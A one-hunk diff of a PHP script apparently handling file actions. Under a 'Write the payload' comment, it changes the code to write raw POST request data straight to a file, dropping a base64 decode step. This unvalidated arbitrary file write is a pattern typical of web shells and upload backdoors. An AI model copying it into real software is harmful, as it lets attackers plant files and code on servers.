@@ -102,7 +102,7 @@ if (isset($file) && isset($action)) {
 					}
 					
 					/* Write the payload */
-					fwrite($fh, base64_decode($_POST[$payload]));
+					fwrite($fh, $_POST[$payload]);
 					fclose($fh);
 				}
 				
